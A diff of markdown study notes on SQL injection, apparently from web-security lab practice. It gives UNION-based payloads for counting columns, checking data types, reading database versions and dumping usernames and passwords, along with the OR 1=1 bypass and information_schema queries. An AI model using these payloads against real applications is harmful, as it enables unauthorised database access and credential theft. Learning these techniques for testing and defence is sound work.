@@ -26,25 +26,25 @@ when the attacker uses the same communication channel to both launch the attack 
 
     - the number and order of columns must be the same in all queries, data type must be the same
     - to determine the column (use ORDER BY, use NULL VALUES)
-
+#### union
 - to check the number of columns
     `' ORDER by 3 --  (some doesn't accept -- so we can use #)`
     `' ORDER by 3 # (to url encode, CTRL+U)`
     - 'ORDER+by+2%23 if 200 okay, 2 columns present
-    - 'ORDER+by+3%23 if 500 internal server error, 3rd column not present (3-1=2 colums only)
+    - 'ORDER+by+3%23 if 500 internal server error, 3rd column not present (3-1=2 columns only)
 
     - another method
-        UNION SELECT NULL , if error incorrect no. of column
-        UNION SELECT NULL, NULL ,if 200 okay , 2 columns
+       `' UNION SELECT NULL --`, if error incorrect no. of column
+        `' UNION SELECT NULL, NULL--` ,if 200 okay , 2 columns
 
 - to check if data type is same, `' UNION SELECT 'a', 'a'#`
     this checks if data type of 1st column is text , and 2nd column is also text.
-
+    `'UNION SELECT NULL,'a',NULL --` (to check if particular column has string, if 200 success, otherwise not string)
 
 - to find version of database,
-' UNION SELECT @@version, NULL# (null is added because there are 2 columns)
+`' UNION SELECT @@version, NULL# `  (null is added because there are 2 column)
 
-    `www.test.com/app.php?id=' UNION SELECT username, password FROM users--`
+`www.test.com/app.php?id=' UNION SELECT username, password FROM users--`
     we didn't give id so it's empty
     `output:ac1, passw1, adm1, pass2`
 
@@ -131,12 +131,30 @@ SELECT * FROM products WHERE category = 'Gifts'-- AND released = 1
 __Since 1=1 is always true, the query will return all items.__
 SELECT * FROM products WHERE category = 'Gifts' OR 1=1-- AND released = 1
 
-* to expoit sql injection vulnerability, it is necessary to know some information like the type and version of the database software, the tables and columns that the database contains. 
+* to expoit sql injection vulnerability, it is necessary to know some information like the type and __version of the database__ software, the tables and columns that the database contains. 
 
 - Microsoft, MySQL	SELECT @@version
 - Oracle	SELECT * FROM v$version
 - PostgreSQL	SELECT version()
 `' UNION SELECT @@version--`
+
+__information_schema.tables__
+
+`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
